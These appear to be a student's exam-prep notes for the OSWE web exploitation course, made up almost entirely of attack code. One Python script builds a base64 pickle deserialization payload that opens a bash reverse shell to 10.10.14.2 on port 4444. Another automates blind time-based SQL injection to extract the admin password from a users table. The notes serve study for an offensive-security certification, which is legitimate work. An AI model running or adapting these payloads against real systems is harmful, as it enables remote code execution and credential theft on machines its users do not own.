# OSWE White-Box Source Code Audit & Exploit Chaining Notes
**Author**: Ali Malik (`@am-LLM`)  
**Scope**: WEB-300 / OSWE Exam Lab Environment. Insecure Deserialization, SQLi Authentication Bypasses, SSRF & Remote Code Execution.

---

## 1. Python Pickle & YAML Insecure Deserialization

### 1.1 Malicious Pickle Bytecode Generation
```python
import pickle
import base64
import os

class ExploitPayload(object):
    def __reduce__(self):
        # Reverse shell command payload
        cmd = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(ExploitPayload())).decode('utf-8')
print(f"Pickle Payload: {payload}")
```

---

## 2. Blind Time-Based & Boolean SQL Injection Automation

### 2.1 Character Extraction via Binary Search
```python
import requests
import time

def extract_char(position: int) -> str:
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1))>{mid}, sleep(2), 0)-- -"
        t0 = time.time()
        requests.get("http://target.local/search", params={"q": payload})
        elapsed = time.time() - t0
        if elapsed >= 2:
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
```
